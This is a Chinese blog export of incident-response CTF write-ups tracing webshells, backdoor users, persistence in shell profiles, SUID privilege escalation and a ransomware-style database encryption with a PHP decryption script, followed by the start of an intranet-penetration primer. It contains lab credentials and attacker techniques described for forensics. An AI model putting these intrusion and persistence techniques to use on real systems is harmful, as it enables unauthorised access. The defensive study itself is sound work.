<h4 id="任务二-21"><a href="#任务二-21" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.隐藏用户后删除，并将隐藏用户名作为 flag 提交</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-03/78539ce878dbd45ecf43263de4a20234--5278--image-20240703184656882.png" alt="image-20240703184656882"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;guest&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-21"><a href="#任务三-21" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交 &lt;flag&#123;/manager&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>这里我们可以通过注入内存马去连接，也可以通过创建一个ssh账户去登录，这里我选择创建一个ssh账户，反正主要目的就是将app.jar下载下来</p>
<p>发现其对应的路由是&#x2F;exec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/exec&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-18"><a href="#任务四-18" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.分析app.jar文件，将后门的密码作为 flag 提交</span><br></pre></td></tr></table></figure>

<p>很明显能够发现密码是cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;cmd&#125;</span><br></pre></td></tr></table></figure>

<h2 id="java03-fastjson"><a href="#java03-fastjson" class="headerlink" title="java03-fastjson"></a>java03-fastjson</h2><h4 id="任务一-23"><a href="#任务一-23" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson版本作为 flag 提交 flag&#123;x.x.66&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是打fastjson就是</p>
<p>但是发现对着poc打也打不通这个,寄</p>
<h1 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h1><h2 id="blueteam-的小心思"><a href="#blueteam-的小心思" class="headerlink" title="blueteam 的小心思"></a>blueteam 的小心思</h2><h4 id="任务一-24"><a href="#任务一-24" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>直接就是先找流量包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;*.pcap&quot;</span><br></pre></td></tr></table></figure>

<p>然后就是找登录的流量，这个就很简单了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/39b87ddd709986e39bf2e0c8ecbab645--52c0--image-20240706190032849.png" alt="image-20240706190032849"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aa12345^</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d63edb0e9df4cf411398e3658c0237e0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-22"><a href="#任务二-22" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串&quot;upload.php&quot;的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>我们直接就是流量里面搜索一下，直接就是找post数据包，很明显就能找到</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/19c3c0a3d5e83d0d88b931f852a58923--65a0--image-20240706191034662.png" alt="image-20240706191034662"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pluginmgr.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;b05c0be368ffa72e6cb2df7e1e1b27be&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-22"><a href="#任务三-22" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>找webshell了这个又是，这个时候我们直接上d盾即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/e94017c1b0707ed37a9e0e152fc90e5e--a129--image-20240706190916338.png" alt="image-20240706190916338"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum cpg.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;a097b773ced57bb7d51c6719fe8fe5f5&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-19"><a href="#任务四-19" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>这里我们可以通过webshell的时间去查找可执行后门</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/812fcabd46e6c3899fcbd5fd5375b5ec--10d5--image-20240706191859333.png" alt="image-20240706191859333"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/1843006551a41b9713112d82371b4deb--9954--image-20240706192053882.png" alt="image-20240706192053882"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -newerct &#x27;2023-11-18 07:30:00&#x27; ! -newerct &#x27;2023-11-19 07:30:00&#x27; ! -path &#x27;/proc/*&#x27; ! -path /&#x27;sys/*&#x27; ! -path &#x27;/run/*&#x27; -type f -exec ls -lctr --full-time &#123;&#125; \+ 2&gt;/dev/null | grep www-data</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum &quot;/var/www/html/plugins/.       /is.world&quot;       // 注意要加括号</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ee279c39bf3dcb225093bdbafeb9a439&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-12"><a href="#任务五-12" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串&quot;attack&quot;的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/810f9d182bc9232c5fcbb7178f6f0799--76c3--image-20240706192359044.png" alt="image-20240706192359044"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4cda3461543c9a770a3349760594facd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务六-4"><a href="#任务六-4" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/06383628bb8c257b8263770d09e39a1a--48a0--202406081851134.png" alt="202406081851134"></p>
<p>直接就是去找一下这些文件即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/2bc924b1ef5c2d51d57730fbca163cbf--936d--image-20240706193401497.png" alt="image-20240706193401497"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/profile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;65bf3e4a9ac90d75ec28be0317775618&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务七-2"><a href="#任务七-2" class="headerlink" title="任务七"></a>任务七</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>还是上面那个图我们找下就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/.bashrc</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4acc9c465eeeb139c194893ec0a8bcbc&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/a417af5542c96421a986d26e8c3e83b4--e502--image-20240706193112072.png" alt="image-20240706193112072"></p>
<h4 id="任务八"><a href="#任务八" class="headerlink" title="任务八"></a>任务八</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串&quot;user&quot;的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>直接去找到数据库的配置文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/381373aa3989aa7703d40cd7c4e02486--e3f5--image-20240706193540148.png" alt="image-20240706193540148"></p>
<p>成功获得账号和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root/mysql123</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/134f43a5a485b534f0618103a5068596--7d37--image-20240706193647869.png" alt="image-20240706193647869"></p>
<p>发现一个不是默认自带的库</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/0cd081645da684d815ff31e1e88655fa--1e4a--image-20240706193745014.png" alt="image-20240706193745014"></p>
<p>发现无法使用，我们就去找一下对应的文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/9ceb37cf44d2b77298ebb9fad7fe4f8b--1b5f--image-20240706194000965.png" alt="image-20240706194000965"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/d3dfb91ce3def7218c79678ffa230aa0--4969--image-20240706193851754.png" alt="image-20240706193851754"></p>
<p>成功找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPMorgan@0020Chase</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;0928a5424aa6126e5923980ca103560e&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务九"><a href="#任务九" class="headerlink" title="任务九"></a>任务九</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>首先就是去寻找加密文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/be24a0b55ee4a7051da9f1f434023e89--648b--image-20240706194608575.png" alt="image-20240706194608575"></p>
<p>我们这就写一个解密脚本即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$currentDate</span> = <span class="string">&quot;2023-11-18&quot;</span>;  </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$currentDate</span>);  </span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;DeepMountainsGD&quot;</span>), <span class="number">0</span>, <span class="number">16</span>);  </span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;  </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$filePath</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;  </span><br><span class="line">        <span class="variable">$fullPath</span> = <span class="variable">$filePath</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fullPath</span>);  </span><br><span class="line">        <span class="variable">$encryptedContent</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$content</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);  </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$fullPath</span>, <span class="variable">$encryptedContent</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接xshell服务器上运行即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/32b645afcbe20fc0d9dcea749c4ad272--9dc7--image-20240706195427079.png" alt="image-20240706195427079"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Chef</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;8fd82b8864d71ed7fa12b59e6e34cd1c&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务十"><a href="#任务十" class="headerlink" title="任务十"></a>任务十</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag&#123;md5&#125;。</span><br></pre></td></tr></table></figure>

<p>这就盲猜是sudo提权</p>
<p>直接命令去找</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/d9629e0407c7e72e3520acbcc09472b4--3f0e--image-20240706195850300.png" alt="image-20240706195850300"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/0351357f4d9eb3cae867ac3f74009df6--b48a--image-20240706200021392.png" alt="image-20240706200021392"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sudoers</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6585817513b0ea96707ebb0d04d6aeff&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NOP-Team-dmz-A"><a href="#NOP-Team-dmz-A" class="headerlink" title="NOP Team dmz-A"></a>NOP Team dmz-A</h2><h4 id="任务一-25"><a href="#任务一-25" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、请提交禅道的版本号，格式: flag&#123;xx.xxx.xxxx&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/e4776ded09ffd7f6a372f0edf3293b6b--f411--image-20240706201518896.png" alt="image-20240706201518896"></p>
<p>直接就是能看到版本的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18.0.beta1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-23"><a href="#任务二-23" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、分析攻击者使用了什么工具对内网环境进行了信息收集，将该工具名称提交 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/fb6da266eee587f8fce3a36ca7282ef1--0496--image-20240706201623466.png" alt="image-20240706201623466"></p>
<p>可以很明显的找到fscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;fscan&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-23"><a href="#任务三-23" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、攻击者攻击服务器得到shell以后，是处于哪个用户下做的操作，将该用户名提交 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>

<p>有上面我们知道了对应的版本，就可以直接网上找对应的poc去攻击</p>
<p><a href="https://blog.csdn.net/qq_41904294/article/details/128838423">https://blog.csdn.net/qq_41904294/article/details/128838423</a></p>
<p>然后根据对应的poc去流量包中寻找http contains “SCM&#x3D;Subversion”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;nobody&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-20"><a href="#任务四-20" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、攻击者扫描到内网 DMZ-B机器的账户密码为多少格式 flag&#123;root:root&#125;</span><br></pre></td></tr></table></figure>

<p>直接去查看fscan扫出来的结果即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/8eade7634b43a3d2bcbdca198a0e3536--1efe--image-20240706202418896.png" alt="image-20240706202418896"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin:123456&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NOP-Team-dmz-B"><a href="#NOP-Team-dmz-B" class="headerlink" title="NOP Team dmz-B"></a>NOP Team dmz-B</h2><h4 id="任务一-26"><a href="#任务一-26" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、攻击者通过DMZ-A登陆到DMZ-B机器里，在上面发现了DMZ-C机器里的一个密钥，通过某服务直接进行了登陆，请将服务名与登味的用户名提交&lt;格式</span><br><span class="line">flag&#123;ftp:anonymous&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>直接就是通过history命令去查看历史命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ssh:deploy&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Where-1S-tHe-Hacker"><a href="#Where-1S-tHe-Hacker" class="headerlink" title="Where-1S-tHe-Hacker"></a>Where-1S-tHe-Hacker</h2><h4 id="任务一-27"><a href="#任务一-27" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客ID 为多少,将黑客ID 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/d82db2d18bdfe7e37e4f453ee9ca2ca6--005e--image-20240711152853286.png" alt="image-20240711152853286"></p>
<p>直接就是能够找到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;X123567X&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-24"><a href="#任务二-24" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）;</span><br></pre></td></tr></table></figure>

<p>直接就是右键详细就能看到修改时间了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/b5d4237a8b0b71e5709107185cd39e36--c804--image-20240711153826509.png" alt="image-20240711153826509"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023-11-6-4:55:13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-24"><a href="#任务三-24" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;SystemConfig.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-21"><a href="#任务四-21" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>这个也是可以去看一下修改日期，很容易就能够找到了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/9081d245f6c7ade98088dceaf129e6fe--a458--image-20240711154224207.png" alt="image-20240711154224207"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;syscon.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-13"><a href="#任务五-13" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>这个也是很简单，直接点开木马文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;pass&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务六-5"><a href="#任务六-5" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/d242f28a542dc10ed7a1b052953f79fd--4c7b--image-20240711155410828.png" alt="image-20240711155410828"></p>
<p>成功创建了新账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<h4 id="任务七-3"><a href="#任务七-3" class="headerlink" title="任务七"></a>任务七</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024/12/3 9:16:23）;</span><br></pre></td></tr></table></figure>

<p>直接就还是上面的复制一下即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:45:34&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务八-1"><a href="#任务八-1" class="headerlink" title="任务八"></a>任务八</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/ac04667dc5854f2a7fd295a736d0158e--4c88--image-20240711155817233.png" alt="image-20240711155817233"></p>
<p>直接就还是继续去找就行</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/928aac9f7b928689d9832f9a6dd9eeaa--df31--image-20240711155958987.png" alt="image-20240711155958987"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:07&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务九-1"><a href="#任务九-1" class="headerlink" title="任务九"></a>任务九</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/338a7070d1b9fe8a5825864084fe2270--a52f--image-20240711160439388.png" alt="image-20240711160439388"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:58&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务十-1"><a href="#任务十-1" class="headerlink" title="任务十"></a>任务十</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>通过哈希传递攻击来登录，我们搜索登录成功的事件，并注意是否含有NTLM</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/4cc21afdf267514ef02f8843b5f1a89f--94d8--image-20240711160943170.png" alt="image-20240711160943170"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:47:28&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务十一"><a href="#任务十一" class="headerlink" title="任务十一"></a>任务十一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式：&quot;A.exe,B.exe&quot;）;</span><br></pre></td></tr></table></figure>

<p>用D-Eyes扫恶意文件，发现文件Windows Defender自动隔离了，样本提取需要从隔离区恢复即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;SystemTemp.exe, SysnomT.exe&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透知识点总结</title>
    <url>/2024/06/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近打了不少春秋云镜的内网渗透的徽章，所以打算对内网的知识点进行一个总结学习。</p>
<span id="more"></span>

<h1 id="一、内网是什么？"><a href="#一、内网是什么？" class="headerlink" title="一、内网是什么？"></a>一、内网是什么？</h1><p>内网也指局域网，是指在某个区域由多台计算机互连而成的计算机组，组网范围通常在数千米以内。</p>
<p>在局域网中，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等。</p>
<p>内网是封闭的，可以由办公室内的两台计算机组成，也可以由一个公司内的大量计算机组成。</p>
<p>简单来说：内网就是某一区域内封闭的计算机组，由大量的计算机组成。</p>
<p>一个简单的网络拓扑图：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/686758e25b44ac5052c1d58e832b5595--1e96--image-20240603162935647.png" alt="image-20240603162935647"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/24353d28c62d43e09e3103477a6f5a24--c450--2752372-20220719180949017-1117785613.png" alt="2752372-20220719180949017-1117785613"></p>
<p>可以看出就是内网是独立于外网的，外网无法直接去访问内网中的主机，只有通过VPN，代理等技术去间接访问。</p>
<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a>  Web安全学习笔记</p>
<h1 id="二、内网渗透又是什么？"><a href="#二、内网渗透又是什么？" class="headerlink" title="二、内网渗透又是什么？"></a>二、内网渗透又是什么？</h1><p>内网渗透，从字面上理解便是对目标服务器所在内网进行渗透并最终获取域控权限的一种渗透。内网渗透的前提是获取一个webshell，可以是低权限的webshell，因为可以通过提权获取高权限</p>
<p>在进行内网渗透之前需要了解一个概念，<strong>域环境</strong>。在内网中，往往可能存在几百上千台机器，例如需要对机器进行升级、打补丁，设置权限等，管理员不可能一台一台地更新修改，因此衍生出了域环境。  （域控DC一般都是Windows系统） （但并不绝对，<a href="https://www.dbs724.com/113421.html">Linux</a>也能够成为域控）</p>
<p>管理员以一台主机作为域控制器新建一个域，将其他主机加入域中，以域控来操作其他主机。因为域控的最高权限，导致了域控所在的主机的管理员账户密码可以登陆任意一台主机，所以内网渗透的最终目标，往往是拿下域控的权限</p>
<h1 id="三、内网必须知识—-内网穿透"><a href="#三、内网必须知识—-内网穿透" class="headerlink" title="三、内网必须知识—-内网穿透"></a>三、内网必须知识—-内网穿透</h1><p>在渗透测试过程中，我们拿下了一台服务器的权限，并且通过<code>netstat -ano</code>发现开启了3389端口，想要远程桌面连接的时候发现无法连接。这是因为我们获取的服务器所处的环境为内网，而内网主机的3389端口，是公网IP通过端口映射的。也就是说，我们连接的外网IP地址的3389端口，映射到内网中，不一定是那台服务器的3389端口。</p>
<p><strong>解决这种问题的方法有俩种：</strong></p>
<ul>
<li>让目标机器去连接外网主机（必须有一台公网服务器，内网主机能够访问互联网）</li>
<li>在目前机器上设置一个信号站（放一个web文件在目标机器上，所有流量都要经过这个文件通信） （一般情况下就是socks隧道的搭建）</li>
</ul>
<p>在渗透测试过程中，内网主机不能访问互联网是很常见的。</p>
<p>这里可以使用的就是stowaway搭建网络代理 ———————<a href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a></p>
